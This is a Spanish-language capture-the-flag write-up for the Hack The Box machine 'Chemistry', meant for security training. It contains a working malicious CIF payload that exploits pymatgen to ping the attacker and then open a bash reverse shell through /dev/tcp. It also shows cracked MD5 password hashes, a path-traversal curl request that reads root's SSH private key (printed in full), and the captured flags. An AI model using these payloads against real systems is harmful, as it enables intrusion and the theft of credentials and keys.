---
category: Hack The Box
tags:
  - eJPT
  - eWPT
tittle: Machine Chemistry
comments: "true"
image: /assets/img/machines/chemistry/chemistrybanner.jpeg
---
# Introducción
La máquina Chemistry de Hack The Box ofrece una experiencia completa que combina técnicas de enumeración web, análisis de código, identificación de vulnerabilidades conocidas y escalada de privilegios a nivel local. Este writeup documenta el proceso paso a paso seguido para comprometer tanto el acceso inicial como la obtención de privilegios de administrador (root), destacando las herramientas utilizadas, el razonamiento detrás de cada decisión y las vulnerabilidades aprovechadas durante el camino.

### Skills

- Malicious CIF File (RCE)
- SQLite Database File Enumeration
- Cracking Hashes
- CVE 2024-23334

# Enumeración
```bash
nmap -sCV -p22,5000 10.10.11.38

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-30 01:20 -04
Nmap scan report for 10.10.11.38
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Wed, 30 Apr 2025 05:21:04 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=4/30%Time=6811B33F%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\
SF:x20Python/3\.9\.5\r\nDate:\x20Wed,\x2030\x20Apr\x202025\x2005:21:04\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"widt
SF:h=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemis
SF:try\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x2
SF:0\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class=
SF:\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\">
SF:Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>W
SF:elcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\x
SF:20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20In
SF:formation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20c
SF:ontained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class
SF:=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center>
SF:<a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">Re
SF:gister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x
SF:20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBL
SF:IC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x2
SF:0\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Cont
SF:ent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\
SF:n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20r
SF:esponse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400<
SF:/p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20v
SF:ersion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Err
SF:or\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20re
SF:quest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20<
SF:/body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.15 seconds
```

## Fingerprinting del Servicio Web
Se utilizó la herramienta `whatweb` para identificar tecnologías utilizadas por el servicio web en el puerto 5000:
```bash
whatweb http://10.10.11.38:5000

http://10.10.11.38:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.9.5], IP[10.10.11.38], Python[3.9.5], Title[Chemistry - Home], Werkzeug[3.0.3]
```

Al acceder a la página principal, se presenta una interfaz sencilla con el título **"Chemistry CIF Analyzer"**, lo que sugiere que la aplicación está orientada al análisis de archivos en formato CIF. La interfaz incluye dos botones principales: **"Login"** y **"Register"**, lo que indica que el sistema gestiona sesiones de usuario y posiblemente permite el acceso a funcionalidades adicionales tras autenticarse.
![1](/assets/img/machines/chemistry/1.jpeg)

Con solo completar el proceso de registro, se obtiene acceso inmediato al **dashboard** del usuario, donde ya es posible **subir archivos CIF**.
![2](/assets/img/machines/chemistry/2.jpeg)

# Exploración archivo CIF
Los archivos **CIF** Tienen una sintaxis similar a archivos de texto plano con etiquetas y bucles que describen propiedades.

con el siguiente archivo CIF se realizara un ping a la ip atacante:
```text
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping -c 1 10.10.16.2");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

 y por el otro lado se realizara un escucha con tcpump:
```bash
tcpdump -i tun0 icmp -n

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:31:25.264175 IP 10.10.11.38 > 10.10.16.2: ICMP echo request, id 2, seq 1, length 64
13:31:25.264194 IP 10.10.16.2 > 10.10.11.38: ICMP echo reply, id 2, seq 1, length 64

```

# Explotación archivo CIF
En este caso, se reemplaza el comando de prueba (`ping`) por una instrucción más poderosa que abre una conexión inversa desde el servidor hacia nuestra máquina atacante:
```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.2/443 0>&1'
```

El contenido del archivo CIF quedaría así:
```text
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'/bin/bash -i >& /dev/tcp/10.10.16.2/443 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

asegúrate de tener un listener preparado antes de subir el archivo:
```bash
nc -nlp 443

listening on [any] 443 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.38] 36502
bash: cannot set terminal process group (1072): Inappropriate ioctl for device
bash: no job control in this shell
app@chemistry:~$ 
```

# escalada de usuario
Tras obtener acceso a la máquina, se realizó una búsqueda de archivos que pudieran contener información sensible. Se identificó una base de datos SQLite en la siguiente ruta:
```bash
app@chemistry:~$ find . -name database.db
./instance/database.db
app@chemistry:~$ sqlite3 ./instance/database.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> 
```

Una vez accedido al archivo `database.db` mediante SQLite, se listaron las tablas disponibles con el comando. Se identificó una tabla relevante llamada `user`. Al inspeccionar su esquema, se confirmó que contiene campos de `id`, `username` y `password`. 
```bash
sqlite> .tables
structure  user     
sqlite> .schema user
CREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(150) NOT NULL,
        password VARCHAR(150) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
);
sqlite> select * from user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|register|9de4a97425678c5b1288aa70c1669a64
sqlite> 
```

Posteriormente, se extrajeron todos los registros y esto reveló una lista de usuarios junto a sus contraseñas en formato hash. los cuales fueron crackeados:
```text
2861debaf8d99436a10ed6f75a252abf - not found
197865e46b878d9e74a0346b6d59886a - not found
63ed86ee9f624c7b14f1d4f43dc251a5 - unicorniosrosados
02fcf7cfc10adc37959fb21f06c6b467 - not found
3dec299e06f7ed187bac06bd3b670ab2 - not found
9ad48828b0955513f7cf0f7f6510c8f8 - carlos123
6845c17d298d95aa942127bdad2ceb9b - peterparker
c3601ad2286a4293868ec2a4bc606ba3 - victoria123
a4aa55e816205dc0389591c9f82f43bb - not found
6cad48078d0241cca9a7b322ecd073b3 - not found
4af70c80b68267012ecdac9a7e916d18 - not found
4e5d71f53fdd2eabdbabb233113b5dc0 - not found
9347f9724ca083b17e39555c36fd9007 - not found
6896ba7b11a62cacffbdaded457c6d92 - not found
9de4a97425678c5b1288aa70c1669a64 - register
```

Al explorar el sistema de archivos, se accedió al directorio `/home`, donde se encontraron los usuarios `app` y `rosa`. Al intentar ingresar al directorio de `rosa` y leer el archivo `user.txt`, se denegó el acceso con el error `Permission denied`. Al listar los permisos con `ls -l`, se evidenció que el archivo pertenece al usuario `root` y al grupo `rosa`, con permisos de lectura exclusivamente para el propietario y el grupo (`-rw-r-----`), impidiendo su lectura desde la cuenta actual (`app`).
```bash
app@chemistry:~$ cd /home
app@chemistry:/home$ ls
app  rosa
app@chemistry:/home$ cd rosa
app@chemistry:/home/rosa$ ls
user.txt
app@chemistry:/home/rosa$ cat user.txt
cat: user.txt: Permission denied
app@chemistry:/home/rosa$ ls -l
total 4
-rw-r----- 1 root rosa 33 May 11 04:18 user.txt
```

Para acceder al archivo `user.txt`, se utilizó la contraseña previamente crackeada del usuario `rosa`, la cual resultó ser `unicorniosrosados`. Con esto fue posible cambiar de usuario utilizando el comando `su rosa`, lo que permitió acceder exitosamente al archivo protegido `user.txt` y visualizar su contenido:
```bash
app@chemistry:/home/rosa$ su rosa
Password: 
rosa@chemistry:~$ ls
user.txt
rosa@chemistry:~$ cat user.txt 
b732f021f23b9878c3401829f76dae6a
```

# Escalada a root
Se utilizó el comando `ss -nltp` para listar los puertos en escucha, y se observó que hay un servicio escuchando localmente en el puerto 8080 (`127.0.0.1:8080`), lo cual sugiere que se trata de un servicio accesible solo desde la misma máquina que podría ser explotado para la escalada de privilegios. 
```bash
rosa@chemistry:~$ ss -nltp
State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port   Process                                                
LISTEN   0        4096       127.0.0.53%lo:53             0.0.0.0:*                                                             
LISTEN   0        128              0.0.0.0:22             0.0.0.0:*                                                             
LISTEN   0        128              0.0.0.0:5000           0.0.0.0:*       users:(("ss",pid=3031,fd=4),("bash",pid=2839,fd=4))   
LISTEN   0        128            127.0.0.1:8080           0.0.0.0:*                                                             
LISTEN   0        128                 [::]:22                [::]:*      
```

Este comando aprovecha una vulnerabilidad de tipo _Path Traversal_ en un servidor web mal configurado, permitiendo acceder a archivos fuera del directorio permitido mediante el uso de secuencias `../` en la URL. Al usar `--path-as-is`, se evita que `curl` normalice la ruta, permitiendo así solicitar directamente archivos sensibles del sistema, como la clave privada SSH del usuario root ubicada en `/root/.ssh/id_rsa`:
```bash
rosa@chemistry:~$ curl -s -X GET "http://localhost:8080/assets/../../../../root/.ssh/id_rsa" --path-as-is
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

se redirige la salida del comando `curl` al archivo `/tmp/id_rsa`, luego se cambian los permisos del archivo con `chmod 600` para que solo el usuario actual pueda leerlo, dejando lista la clave para ser utilizada en un intento de conexión SSH.
```bash
rosa@chemistry:~$ curl -s -X GET "http://localhost:8080/assets/../../../../root/.ssh/id_rsa" --path-as-is > /tmp/id_rsa
rosa@chemistry:~$ cd /tmp
rosa@chemistry:/tmp$ chmod 600 id_rsa
rosa@chemistry:/tmp$ ls -l id_rsa
-rw------- 1 rosa rosa 2602 May 11 19:27 id_rsa
```

En esta última etapa, se utiliza la clave privada obtenida previamente para iniciar sesión como usuario _root_ en el sistema local mediante SSH.
```bash
rosa@chemistry:/tmp$ ssh -i id_rsa root@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:dA5ziYneQdL2rpHt1KIbpl7EQwZtsehS7ovqWqI7cMs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

root@chemistry:~# whoami
root
root@chemistry:~# ls
root.txt
root@chemistry:~# cat root.txt 
23055b88a41584c9c20765d79b640a03
```

